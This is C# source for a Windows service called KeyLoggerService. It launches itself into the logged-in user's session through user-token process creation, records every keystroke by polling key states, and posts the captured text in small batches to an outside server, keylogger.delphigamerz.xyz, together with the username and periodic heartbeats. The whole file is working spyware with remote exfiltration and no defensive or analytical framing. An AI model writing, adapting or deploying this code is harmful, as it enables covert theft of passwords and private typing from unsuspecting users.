using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Http;
using System.Windows.Forms;

namespace KeyLoggerService
{
    public partial class Service1 : ServiceBase
    {
        private static string buf = "";
        private static readonly HttpClient client = new HttpClient();
        private Thread _monitorThread;
        private bool _stopping = false;
        private uint _lastLaunchedSessionId = 0xFFFFFFFF;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();

        [DllImport("wtsapi32.dll", SetLastError = true)]
        private static extern bool WTSQueryUserToken(uint sessionId, out IntPtr Token);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public Service1()
        {
            InitializeComponent();
            SetupTls();
        }

        private static void SetupTls()
        {
            try
            {
                // Ensure TLS 1.2 is used for HTTPS requests
                System.Net.ServicePointManager.SecurityProtocol |= System.Net.SecurityProtocolType.Tls12;
            }
            catch { }
        }

        protected override void OnStart(string[] args)
        {
            LogToFile($"Service starting. Session ID: {Process.GetCurrentProcess().SessionId}. User: {Environment.UserName}");
            _stopping = false;
            _monitorThread = new Thread(MonitorSession);
            _monitorThread.IsBackground = true;
            _monitorThread.Start();
        }

        protected override void OnStop()
        {
            _stopping = true;
            KillAllLoggers();
            if (_monitorThread != null && _monitorThread.IsAlive)
            {
                _monitorThread.Join(1000);
            }
        }

        private void KillAllLoggers()
        {
            try
            {
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                string processName = Path.GetFileNameWithoutExtension(currentExe);
                var processes = Process.GetProcessesByName(processName);
                int currentPid = Process.GetCurrentProcess().Id;
                foreach (var p in processes)
                {
                    try
                    {
                        if (p.Id != currentPid && p.SessionId != 0)
                        {
                            p.Kill();
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void MonitorSession()
        {
            while (!_stopping)
            {
                try
                {
                    uint sessionId = WTSGetActiveConsoleSessionId();
                    if (sessionId != 0xFFFFFFFF && sessionId != 0) // Session 0 is the service session
                    {
                        if (!IsLoggerRunning(sessionId))
                        {
                            LogToFile($"No logger in session {sessionId}, launching...");
                            LaunchLoggerInSession(sessionId);
                        }
                    }
                }
                catch (Exception ex)
                {
                    LogToFile($"MonitorSession Error: {ex.Message}");
                }
                Thread.Sleep(5000);
            }
        }

        private bool IsLoggerRunning(uint sessionId)
        {
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            string processName = Path.GetFileNameWithoutExtension(currentExe);
            var processes = Process.GetProcessesByName(processName);
            foreach (var p in processes)
            {
                try
                {
                    if (p.SessionId == (int)sessionId)
                    {
                        // To be sure it's the logger, we could check command line, 
                        // but for now, any process of ours in a user session is likely the logger.
                        return true;
                    }
                }
                catch { }
            }
            return false;
        }

        private void LaunchLoggerInSession(uint sessionId)
        {
            IntPtr hToken = IntPtr.Zero;
            try
            {
                if (!WTSQueryUserToken(sessionId, out hToken))
                {
                    LogToFile($"WTSQueryUserToken failed for session {sessionId}. Error: {Marshal.GetLastWin32Error()}");
                    return;
                }

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = @"Winsta0\default"; // Required for interactive processes

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                string appPath = Process.GetCurrentProcess().MainModule.FileName;
                string cmdLine = $"\"{appPath}\" --logger";

                if (CreateProcessAsUser(hToken, null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi))
                {
                    LogToFile($"Successfully launched logger in session {sessionId}. PID: {pi.dwProcessId}");
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                else
                {
                    LogToFile($"CreateProcessAsUser failed. Error: {Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                LogToFile($"LaunchLoggerInSession Exception: {ex.Message}");
            }
            finally
            {
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
            }
        }

        public static void RunAsLogger()
        {
            SetupTls();
            LogToFile($"Logger process starting in session {Process.GetCurrentProcess().SessionId}. User: {Environment.UserName}");
            
            DateTime lastHeartbeat = DateTime.Now;
            while (true)
            {
                Thread.Sleep(100);

                // Send heartbeat every 60 seconds to verify network
                if ((DateTime.Now - lastHeartbeat).TotalSeconds > 60)
                {
                    lastHeartbeat = DateTime.Now;
                    Task.Run(() => SendPayload("<HEARTBEAT>"));
                }

                // An even more advanced check
                bool shift = false;
                short shiftState = (short)GetAsyncKeyState(16);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                
                bool caps = (GetKeyState(0x14) & 0x0001) != 0;
                bool isBig = shift | caps;

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if ((state & 0x8000) != 0) // Key is pressed
                    {
                        // Check for Space and Enter
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "&#x0a;"; continue; }

                        // Skip mouse buttons
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;

                        // Skip Shift, Ctrl, Alt, and other modifier keys
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) continue;
                        if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) continue;
                        if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) continue;

                        // Skip other non-essential keys
                        if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) continue;
                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) continue;
                        if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) continue;
                        if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) continue;
                        if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) continue;
                        if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) continue;

                        // Handle single character keys
                        if (((Keys)i).ToString().Length == 1 || ((Keys)i) >= Keys.D0 && ((Keys)i) <= Keys.D9)
                        {
                            char key = (char)0;
                            string keyName = ((Keys)i).ToString();
                            if (keyName.Length == 1)
                            {
                                key = keyName[0];
                            }
                            else if (keyName.StartsWith("D") && keyName.Length == 2)
                            {
                                key = keyName[1];
                            }

                            if (key != 0)
                            {
                                if (char.IsLetter(key) && isBig)
                                {
                                    buf += char.ToUpper(key);
                                }
                                else if (char.IsLetter(key) && !isBig)
                                {
                                    buf += char.ToLower(key);
                                }
                                else
                                {
                                    buf += key;
                                }
                            }
                        }
                        else
                        {
                            // Wrap non-single-character keys in angle brackets
                            buf += $"<{((Keys)i).ToString()}>";
                        }

                        if (buf.Length >= 5)
                        {
                            string toSend = buf;
                            buf = "";
                            LogToFile($"Threshold reached, sending {toSend.Length} chars from session {Process.GetCurrentProcess().SessionId}");
                            Task.Run(() => SendPayload(toSend));
                        }
                    }
                }
            }
        }

        private static async Task SendPayload(string payload)
        {
            try
            {
                // Create a clean URL each time to avoid any caching or state issues if username changes (though it shouldn't)
                string currentUsername = Environment.UserName == "SYSTEM" ? Environment.MachineName : Environment.UserName;
                string url = $"https://keylogger.delphigamerz.xyz/log?username={Uri.EscapeDataString(currentUsername)}";

                var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                var response = await client.PostAsync(url, content);
                
                if (!response.IsSuccessStatusCode)
                {
                     LogToFile($"Error: {response.StatusCode} - {response.ReasonPhrase}");
                }
            }
            catch (Exception ex)
            {
                LogToFile($"Exception: {ex.Message}\n{ex.StackTrace}");
            }
        }

        private static void LogToFile(string message)
        {
            try
            {
                string logPath = @"C:\ProgramData\KeyLoggerService\service.log";
                string dir = Path.GetDirectoryName(logPath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                File.AppendAllText(logPath, $"{DateTime.Now}: {message}\n");
            }
            catch { }
        }
    }
}
